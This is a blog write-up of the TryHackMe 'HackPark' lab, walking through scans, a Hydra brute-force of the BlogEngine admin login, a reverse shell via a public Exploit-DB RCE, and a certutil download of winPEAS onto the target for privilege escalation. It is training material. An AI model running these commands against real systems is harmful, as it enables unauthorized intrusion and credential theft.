<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>THM - HackPark without MetaSploit |</title><meta name=Description content><meta property="og:title" content="THM - HackPark without MetaSploit"><meta property="og:description" content="Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
Target THM - HackPark
Recon According to the preview picture of the video, we will face :
 Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM."><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/thm-hackpark-without-metasploit/"><meta property="article:published_time" content="2021-02-21T00:00:00+00:00"><meta property="article:modified_time" content="2021-02-21T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="THM - HackPark without MetaSploit"><meta name=twitter:description content="Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
Target THM - HackPark
Recon According to the preview picture of the video, we will face :
 Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM."><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/thm-hackpark-without-metasploit/><link rel=prev href=https://www.masoopy.com/htb-nibbles-without-metasploit/><link rel=next href=https://www.masoopy.com/thm-gamezone/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"THM - HackPark without MetaSploit","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/"},"genre":"posts","keywords":"THM","wordCount":2278,"url":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/","datePublished":"2021-02-21T00:00:00+00:00","dateModified":"2021-02-21T00:00:00+00:00","publisher":{"@type":"Organization","name":"Author"},"author":{"@type":"Person","name":"Author"},"description":""}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.masoopy.com\/"},{"@type":"ListItem","position":2,"name":"hacking","item":"https://www.masoopy.com/categories/hacking/"},{"@type":"ListItem","position":3,"name":"THM - HackPark without MetaSploit"}]}</script></head><body data-header-desktop data-header-mobile><script>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy class=header-logo>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/cheatsheets/>Cheatsheets </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy class=header-logo>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/>Posts</a><a class=menu-item href=/cheatsheets/>Cheatsheets</a><a class=menu-item href=/tags/>Tags</a><a class=menu-item href=/categories/>Categories</a><a class=menu-item href=/about/>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><main class=main><div class="container content-article theme-classic"><div class=toc id=toc-auto><div class=toc-title>Contents</div><div class=toc-content id=toc-content-auto></div></div><div class=header-post><div class=post-title><div class=post-all-meta><div class=breadcrumbs><a href=/>Home </a>/ <a href=/categories/hacking/>hacking </a>/ <a href=/>THM - HackPark without MetaSploit</a></div><h1 class="single-title animated flipInX">THM - HackPark without MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-category><a href=/categories/hacking/><i class="far fa-folder fa-fw"></i>&nbsp;hacking</a>&nbsp;<a href=/categories/write-ups/><i class="far fa-folder fa-fw"></i>&nbsp;write-ups</a>
</span>&nbsp;&nbsp;&nbsp;&nbsp;<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time class=timeago datetime=2021-02-21>2021-02-21</time>&nbsp;&nbsp;&nbsp;&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2278 words
&nbsp;&nbsp;&nbsp;&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;11 minutes</div></div></div></div></div><article class="single toc-start"><div class="content-block content-block-first content-block-position"><div class=post><div class=image-theme-classic><img src=/images/2021/02/HackPark_Logo.png style=width:100%></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#target>Target</a></li><li><a href=#recon>Recon</a></li><li><a href=#enum>Enum</a><ul><li><a href=#web-scanning>Web scanning</a></li><li><a href=#cracking-authentication-with-burp>Cracking authentication with Burp</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#getting-initial-shell>Getting initial shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><h2 id=intro>Intro</h2><p>New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.</p><h2 id=target>Target</h2><p><a href=https://tryhackme.com/room/hackpark target=_blank rel="noopener noreffer">THM - HackPark</a></p><h2 id=recon>Recon</h2><p>According to the preview picture of the video, we will face :</p><ul><li>Windows box ;</li><li>Misc : Hydra, RCE, WinPEAS.</li></ul><p>So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally <code>WinPEAS</code> to elevate our privileges to <code>SYSTEM</code>. Let&rsquo;s see!</p><h2 id=enum>Enum</h2><p>Let&rsquo;s run our nmap <code>scan</code>. Note that this time we had to add the <code>-Pn</code> switch :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>sudo nmap -T4 -A -p- -Pn -oA scan $target_ip
</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:25 CET
Nmap scan report for 10.10.144.161
Host is up (0.033s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2020-10-01T21:12:23
|_Not valid after:  2021-04-02T21:12:23
|_ssl-date: 2021-02-21T08:27:33+00:00; +3s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.23 ms 10.11.0.1
2   32.53 ms 10.10.144.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
</code></pre></div><p>We discovered only two services :</p><ul><li>Web server on 80/tcp : Microsoft IIS 8.5</li><li>RDP.</li></ul><h3 id=web-scanning>Web scanning</h3><p>Now, we&rsquo;ll run two longs scans, dedicated to websites. During those scans, we will manually browse to our website, with <code>Burp</code> proxy. I&rsquo;ll talk about this right below the scans output.</p><p>First scan :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>nikto -h http://10.10.144.161
</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.144.161
+ Target Hostname:    10.10.144.161
+ Target Port:        80
+ Start Time:         2021-02-21 09:29:23 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/8.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header &#39;content-script-type&#39; found, with contents: text/javascript
+ Uncommon header &#39;content-style-type&#39; found, with contents: text/css
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry &#39;/search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/search.aspx&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/archive/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/archive.aspx&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ &#34;robots.txt&#34; contains 6 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ Uncommon header &#39;x-aspnetwebpages-version&#39; found, with contents: 3.0
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /archives/: This might be interesting...
+ 8705 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-02-21 09:37:29 (GMT1) (486 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre></div><p>Second scan :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://10.10.144.161 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .asp,aspx
</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.144.161
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx,asp
[+] Timeout:        10s
===============================================================
2021/02/21 09:32:51 Starting gobuster
===============================================================
/blog.aspx (Status: 200)
/archives (Status: 200)
/archive (Status: 200)
/archive.aspx (Status: 200)
/search (Status: 200)
/search.aspx (Status: 200)
/content (Status: 301)
/page.aspx (Status: 302)
/default.aspx (Status: 200)
/admin (Status: 302)
/contact_us (Status: 200)
/contacts (Status: 200)
/contactus (Status: 200)
/contact (Status: 200)
/contact.aspx (Status: 200)
/account (Status: 301)
/post.aspx (Status: 302)
/scripts (Status: 301)
/contact-us (Status: 200)
/custom (Status: 301)
/contactinfo (Status: 200)
/setup (Status: 302)
/error.aspx (Status: 200)
/fonts (Status: 301)
/contact_off (Status: 200)
/searchresults (Status: 200)
/search_form (Status: 200)
/searchresultsbrief (Status: 200)
/searchtips (Status: 200)
/search2 (Status: 200)
/contact_form (Status: 200)
/contact_information (Status: 200)
/archive_query (Status: 200)
/searching (Status: 200)
/contactform (Status: 200)
/search-engines (Status: 200)
/contacto (Status: 200)
/search_left (Status: 200)
/search_results (Status: 200)
/searchengine (Status: 200)
/search_tips (Status: 200)
/contact-info (Status: 200)
/contact_sales (Status: 200)
/searchbutton (Status: 200)
/contact1 (Status: 200)
/search_off (Status: 200)
/searchcontent (Status: 200)
/search_engines (Status: 200)
/contacting (Status: 200)
/searchengines (Status: 200)
/search1 (Status: 200)
/search_help (Status: 200)
/search_right (Status: 200)
/search_engine (Status: 200)
/contact2 (Status: 200)
/searchform (Status: 200)
/searchhelp (Status: 200)
/search_close (Status: 200)
/search_icon (Status: 200)
/contact-me (Status: 200)
/archives2 (Status: 200)
/search-new (Status: 200)
/searches (Status: 200)
/contact_info (Status: 200)
/search3 (Status: 200)
/searchnav (Status: 200)
/contactus_off (Status: 200)
/archived (Status: 200)
/searchbox (Status: 200)
/search_btn (Status: 200)
/search_result (Status: 200)
/archive1 (Status: 200)
/search-tools (Status: 200)
/search-top (Status: 200)
/search_adv (Status: 200)
/searchtop (Status: 200)
/searchday (Status: 200)
/search_header (Status: 200)
/contact-off (Status: 200)
/search_attrib (Status: 200)
/search!default (Status: 200)
/contactgnw (Status: 200)
/searchproduct (Status: 200)
/search_2 (Status: 200)
/search_view (Status: 200)
/search_top (Status: 200)
/searchbar (Status: 200)
/search_advanced (Status: 200)
/search_getprod (Status: 200)
/search_windows (Status: 200)
/search_1 (Status: 200)
/searchtools (Status: 200)
/search_en (Status: 200)
/search_tools (Status: 200)
/search_button (Status: 200)
/contactsales (Status: 200)
/search-left (Status: 200)
/contactbutton (Status: 200)
/contactar (Status: 200)
/searchindex (Status: 200)
/contacttables (Status: 200)
/search-marketing (Status: 200)
/searchsite (Status: 200)
/search_nero (Status: 200)
/search_kaspersky (Status: 200)
/search_anydvd (Status: 200)
/search_tomtom (Status: 200)
/search_vista (Status: 200)
/contact_en (Status: 200)
/searchresult (Status: 200)
/search_for (Status: 200)
/search_head (Status: 200)
/search-tips (Status: 200)
/search_title (Status: 200)
/contactme (Status: 200)
/searchstandardra9 (Status: 200)
/search_site (Status: 200)
/contact_index (Status: 200)
/search_n (Status: 200)
/search-co (Status: 200)
/search_avi (Status: 200)
/contact_up (Status: 200)
/searchinform (Status: 200)
/search-right (Status: 200)
/search_advance (Status: 200)
/searchadv (Status: 200)
/searchcode (Status: 200)
/archive2 (Status: 200)
/searchfor (Status: 200)
/search_archives (Status: 200)
/search_rss (Status: 200)
/contact-tables (Status: 200)
/contact_editor (Status: 200)
/search_marketing (Status: 200)
/search_ (Status: 200)
/search_v2 (Status: 200)
/search_www (Status: 200)
/search_avast (Status: 200)
/archive-zip (Status: 200)
/search-engine (Status: 200)
/searchsecurity (Status: 200)
/searchleft (Status: 200)
/searchright (Status: 200)
/search_3 (Status: 200)
/search_nav (Status: 200)
/search_knowledge (Status: 200)
/contact-form (Status: 200)
/contactlist (Status: 200)
/contact-en (Status: 200)
/search_4 (Status: 200)
/contact_pair (Status: 200)
/archive2003 (Status: 200)
/search-adv (Status: 200)
/contact_list (Status: 200)
/archive_news (Status: 200)
/searcher (Status: 200)
/contact_management (Status: 200)
/searchicom (Status: 200)
/search_web (Status: 200)
/contact%20us (Status: 200)
/contact_tables (Status: 200)
/search-wy (Status: 200)
/search-me (Status: 200)
/search-wv (Status: 200)
/search-tx (Status: 200)
/search-nm (Status: 200)
/search-nj (Status: 200)
/search-id (Status: 200)
/search-ks (Status: 200)
/search-mi (Status: 200)
/search-ia (Status: 200)
/search-sc (Status: 200)
/search-ri (Status: 200)
/search-dc (Status: 200)
/search-tn (Status: 200)
/search-nh (Status: 200)
/search-mt (Status: 200)
/search-nv (Status: 200)
/search-vt (Status: 200)
/search-ok (Status: 200)
/search-pa (Status: 200)
/search-la (Status: 200)
/search-hi (Status: 200)
/search-fl (Status: 200)
/search-nc (Status: 200)
/search-ar (Status: 200)
/search-de (Status: 200)
/search-ak (Status: 200)
/search-al (Status: 200)
/search-ct (Status: 200)
/search-ca (Status: 200)
/search-sd (Status: 200)
/search-va (Status: 200)
/search-mo (Status: 200)
/search-ky (Status: 200)
/search-ma (Status: 200)
/search-mn (Status: 200)
/search-ms (Status: 200)
/search-ga (Status: 200)
/search-ut (Status: 200)
/search-wi (Status: 200)
/search-or (Status: 200)
/search-ny (Status: 200)
/search-md (Status: 200)
/search-in (Status: 200)
/search-il (Status: 200)
/search-az (Status: 200)
/search-oh (Status: 200)
/searchview (Status: 200)
/contact_button (Status: 200)
/search-16x16 (Status: 200)
/search_options (Status: 200)
/searchnews (Status: 200)
/search_go (Status: 200)
/contactoff (Status: 200)
/search_text (Status: 200)
/search_music (Status: 200)
/searchreg (Status: 200)
/contact_details (Status: 200)
/search_french (Status: 200)
/search_eragon (Status: 200)
/search_windows-vista (Status: 200)
/search_saw (Status: 200)
/search_porn (Status: 200)
/search_office-2007 (Status: 200)
/search_hentai (Status: 200)
/search_games (Status: 200)
/search_xxx (Status: 200)
/search_sex (Status: 200)
/contact-details (Status: 200)
/contactenos (Status: 200)
/archive_2006-m11 (Status: 200)
/contactusform (Status: 200)
/searchprofile!input (Status: 200)
/searchguide (Status: 200)
/search_index (Status: 200)
/search_avg (Status: 200)
/search-events (Status: 200)
/search_norton (Status: 200)
/search_spyware-doctor (Status: 200)
/search_sims (Status: 200)
/searchall (Status: 200)
/search-nd (Status: 200)
/search-wa (Status: 200)
/search-ne (Status: 200)
/search-ico (Status: 200)
/contact_main (Status: 200)
/contact_icon (Status: 200)
/search-icon (Status: 200)
/search_txt (Status: 200)
/archiver (Status: 200)
/search_blue (Status: 200)
/contact_call (Status: 200)
/archive2001 (Status: 200)
/archive2004 (Status: 200)
/search_bottom (Status: 200)
/search_jobs (Status: 200)
/contactus-off (Status: 200)
/search-bool (Status: 200)
/contact_title (Status: 200)
/contactus1 (Status: 200)
/searchwin2000 (Status: 200)
/search-inside (Status: 200)
/searchtype (Status: 200)
/searchout (Status: 200)
/search_city (Status: 200)
/search-cat (Status: 200)
/searchtool (Status: 200)
/contactbut (Status: 200)
/search_sweaw (Status: 200)
/search_dr (Status: 200)
/search_ediuspro4 (Status: 200)
/search_tweakmaster (Status: 200)
/search_msn (Status: 200)
/contact-lenses (Status: 200)
/search_office (Status: 200)
/archive2005 (Status: 200)
/searchhelppage (Status: 200)
/search_new (Status: 200)
/contact_head (Status: 200)
/contact_support (Status: 200)
/searchq (Status: 200)
/archive2006 (Status: 200)
/archive_2006-m03 (Status: 200)
/archive_2006-m02 (Status: 200)
/archive_2006-m04 (Status: 200)
/contact_new (Status: 200)
/contact_forms (Status: 200)
/search-1 (Status: 200)
/contact_top (Status: 200)
/search_label (Status: 200)
/contact_e (Status: 200)
/contacte (Status: 200)
/archive_search (Status: 200)
/searchx (Status: 200)
/archives_off (Status: 200)
/search-help (Status: 200)
/contactless (Status: 200)
/search97cgi (Status: 200)
/search_02 (Status: 200)
/search_01 (Status: 200)
/search-results (Status: 200)
/search_preteen (Status: 200)
/http%3a%2f%2fblog (Status: 200)
/http%3a%2f%2fblog.aspx (Status: 200)
/archive_2006-m08 (Status: 200)
/archive_2005-w16 (Status: 200)
/archive_2005-w14 (Status: 200)
/archive_2005-w18 (Status: 200)
/archive_2006-m12 (Status: 200)
/archive_2005-w23 (Status: 200)
/archive_2005-w43 (Status: 200)
/search-line (Status: 200)
/contactinformation (Status: 200)
/search_sm (Status: 200)
/searchbox_top (Status: 200)
/contact_offline (Status: 200)
/contact_www (Status: 200)
/contact_blog (Status: 200)
/contact_web (Status: 200)
/searchnetworking (Status: 200)
/search-en (Status: 200)
/contactcw (Status: 200)
/archives1 (Status: 200)
/search_winrar (Status: 200)
/search_nod32 (Status: 200)
/search_alcohol (Status: 200)
/contactussupport (Status: 200)
/archive02 (Status: 200)
/search_lockdown (Status: 200)
/contact_remove (Status: 200)
/searchbottom (Status: 200)
/searchlogo_dmoz (Status: 200)
/searchcloud (Status: 200)
/search_end (Status: 200)
/searchpro (Status: 200)
/search_6 (Status: 200)
/archivespg2 (Status: 200)
/contactu (Status: 200)
/contact_address (Status: 200)
/contact_reseller (Status: 200)
/contacttitle (Status: 200)
/contactmap_small (Status: 200)
/contactmap_large (Status: 200)
/contactmap_thumb (Status: 200)
/searchtitle (Status: 200)
/contact_on (Status: 200)
/contact_a (Status: 200)
/search_mnogosearch (Status: 200)
/archive_tar (Status: 200)
/archive_zip (Status: 200)
/archive2002 (Status: 200)
/archive2000 (Status: 200)
/search_packages (Status: 200)
/search_contents (Status: 200)
/search_search (Status: 200)
/contact_osdl (Status: 200)
/searchareaborder (Status: 200)
/contactvoa (Status: 200)
/search_on (Status: 200)
/search_srcheader (Status: 200)
/contact_addressbook (Status: 200)
/contact_secunia (Status: 200)
/searchhistory (Status: 200)
===============================================================
2021/02/21 09:36:17 Finished
===============================================================
</code></pre></div><p>Checking <code>searchsploit</code> for vuln on <code>IIS 8.5</code> won&rsquo;t reveal anything.</p><p>In the meantime, manual browsing to the website tells us it is a blog, and it is running on <code>BlogEngine.NET</code> which seems to be an Open source blogging platform for ASP / Windows platforms.</p><p>Using <code>searchsploit</code>, we&rsquo;ll discover that some versions are vulnerable to various stuff (including RCE), however we do not know yet, our version.</p><p>However, by looking at the source code of the main page, we&rsquo;ll see that we are using <code>BlogEngine 3.3.6.0</code> :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Blog_Version.png data-srcset="/images/2021/02/HackPark_Blog_Version.png, /images/2021/02/HackPark_Blog_Version.png 1.5x, /images/2021/02/HackPark_Blog_Version.png 1.6x" data-sizes=auto alt="HackPark Blog Version" title=HackPark_Blog_Version.png></div></p><p>This confirms that our target is vulnerable to RCEs! By reading the RCEs on <a href=https://www.exploit-db.com/ target=_blank rel="noopener noreffer">Exploit-DB</a>, we see that all of them require access to the admin panel, they are Authenticated RCE. I guess, this is where <code>Hydra</code> will come useful and the <code>http://10.10.144.161/admin</code> URL we found during our previous scans.</p><h3 id=cracking-authentication-with-burp>Cracking authentication with Burp</h3><p>By reading the &ldquo;Get Started with BlogEngine&rdquo;, we learn that default credentials are <code>admin</code> // <code>admin</code>. However, it doesn&rsquo;t work. We will assume that the password has been changed but not the user!</p><p>Before running <code>Hydra</code>, we need to gather URL parameter, I like to use <code>Burp</code> proxy history in order to do so :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Burp_History.png data-srcset="/images/2021/02/HackPark_Burp_History.png, /images/2021/02/HackPark_Burp_History.png 1.5x, /images/2021/02/HackPark_Burp_History.png 1.6x" data-sizes=auto alt="HackPark Proxy History Version" title=HackPark_Burp_History.png></div></p><p>Then, I&rsquo;ll try to attack it like this :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.106.193 http-post-form &#34;/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=Q6%2Fwyy29Lyg61L12FTfXHvmaqgecBgtXUIRuiIVZJcFGpkb5tUJh93nSVJyuTgOfHtyLi9OgrKHFNl1seijcfd5djPWqvYuL6snvmS5V63eSntNGRbmzESEkm6ktoT2Dte8ynazWqXYY2eHuMMAEfJW605kE5c0VpnhTqNIq0L2E%2FkNX&amp;__EVENTVALIDATION=gvR4CPW1DPVTT4Sm1GtfP5izsS5fJPp9bKo0SKI3XahFdVSdCQszWrKRTgWPFKxEICXK4t8lOn0TU0fheh7qDW4tv5IcHTzcIQ3ZVX8Mup8bVrtQVspuQDJhG%2B8j5lpl2zcnQjaPXY%2FfwjBMZou39tlG7J8yzxpVlOiY%2BkR3Vd0caNnr&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed&#34; -vV
</code></pre></div><p>After a few seconds, with a good wordlist, it will find the password :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Hydra_Pass.png data-srcset="/images/2021/02/HackPark_Hydra_Pass.png, /images/2021/02/HackPark_Hydra_Pass.png 1.5x, /images/2021/02/HackPark_Hydra_Pass.png 1.6x" data-sizes=auto alt="HackPark Hydra Pass" title=HackPark_Hydra_Pass.png></div></p><p>It is time to play with our Authenticated RCEs!</p><h2 id=exploitation>Exploitation</h2><h3 id=getting-initial-shell>Getting initial shell</h3><p>This <a href=https://www.exploit-db.com/exploits/46353 target=_blank rel="noopener noreffer">RCE</a> seems to apply to our target and is well written, it explains step by step how to exploit it :</p><ol start=0><li>Setup <code>netcat</code> listener on our attacking box ;</li><li>We create a file called <code>PostView.ascx</code> and modify it with the IP and port of our attacking box ;</li><li>Upload it ;</li><li>Visit URL to trigger to remote shell.</li></ol><p>And it worked :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Initial_Shell.png data-srcset="/images/2021/02/HackPark_Initial_Shell.png, /images/2021/02/HackPark_Initial_Shell.png 1.5x, /images/2021/02/HackPark_Initial_Shell.png 1.6x" data-sizes=auto alt="HackPark Initial Shell" title=HackPark_Initial_Shell.png></div></p><p>Unfortunately, we are not <code>SYSTEM</code>. Like we guessed during recon, we&rsquo;ll have to elevate our priv.</p><h3 id=privesc>PrivEsc</h3><p>Let&rsquo;s get <code>WinPEAS</code> on our target. I like to use <code>winPEAS.bat</code> and upload via my own machine, serving it with Python module <code>SimpleHTTPServer</code>. Then, I&rsquo;ll download in on target with the following command:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
</code></pre></div><p>NB : make sure to use a writable folder, such as: <code>C:\Users\Public</code>.</p><p>We run it with :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>winPEAS.bat log
</code></pre></div><p>The <code>log</code> switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you &ldquo;quieter&rdquo;, which is want you probably want.</p><p>WinPEAS will reveal some <code>Administrator credentials</code> :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_Pass.png data-srcset="/images/2021/02/HackPark_Admin_Pass.png, /images/2021/02/HackPark_Admin_Pass.png 1.5x, /images/2021/02/HackPark_Admin_Pass.png 1.6x" data-sizes=auto alt="HackPark Admin Pass" title=HackPark_Admin_Pass.png></div></p><p>We try them in RDP, and boom! We are in as <code>SYSTEM</code> :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_RDP.png data-srcset="/images/2021/02/HackPark_Admin_RDP.png, /images/2021/02/HackPark_Admin_RDP.png 1.5x, /images/2021/02/HackPark_Admin_RDP.png 1.6x" data-sizes=auto alt="HackPark Admin RDP" title=HackPark_Admin_RDP.png></div></p><p>Let&rsquo;s harvest our flags, first user :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_User_Flag.png data-srcset="/images/2021/02/HackPark_User_Flag.png, /images/2021/02/HackPark_User_Flag.png 1.5x, /images/2021/02/HackPark_User_Flag.png 1.6x" data-sizes=auto alt="HackPark User Flag" title=HackPark_User_Flag.png></div></p><p>Then root:</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Root_Flag.png data-srcset="/images/2021/02/HackPark_Root_Flag.png, /images/2021/02/HackPark_Root_Flag.png 1.5x, /images/2021/02/HackPark_Root_Flag.png 1.6x" data-sizes=auto alt="HackPark Root Flag" title=HackPark_Root_Flag.png></div></p><h2 id=outro>Outro</h2><p>In this box, we learned how to use <code>Hydra</code> for credentials cracking and practiced what we&rsquo;ve already been doing before to escalate privileges. A cool little box!</p></div><div class=post><div class=post-info-share><span></span></div><div class=post-footer id=post-footer><div class=post-navigation><div class="post-nav-box nav-box-prev"><a class=nav-box href=/htb-nibbles-without-metasploit/><span class=nav-icon><svg aria-hidden="true" data-prefix="fas" data-icon="chevron-circle-left" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 504C119 504 8 393 8 256S119 8 256 8s248 111 248 248-111 248-248 248zM142.1 273l135.5 135.5c9.4 9.4 24.6 9.4 33.9.0l17-17c9.4-9.4 9.4-24.6.0-33.9L226.9 256l101.6-101.6c9.4-9.4 9.4-24.6.0-33.9l-17-17c-9.4-9.4-24.6-9.4-33.9.0L142.1 239c-9.4 9.4-9.4 24.6.0 34z"/></svg></span><div style=text-align:right;padding-left:10px><div class=nav-text-h>Next article</div><span class=nav-text>HTB - Nibbles without MetaSploit</span></div></a></div><div class="post-nav-box nav-box-next"><a class=nav-box href=/thm-gamezone/><div style=padding-right:10px><div class=nav-text-h>Next article</div><span class=nav-text>THM - GameZone</span></div><span class=nav-icon><svg aria-hidden="true" data-prefix="fas" data-icon="chevron-circle-right" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 8c137 0 248 111 248 248S393 504 256 504 8 393 8 256 119 8 256 8zm113.9 231L234.4 103.5c-9.4-9.4-24.6-9.4-33.9.0l-17 17c-9.4 9.4-9.4 24.6.0 33.9L285.1 256 183.5 357.6c-9.4 9.4-9.4 24.6.0 33.9l17 17c9.4 9.4 24.6 9.4 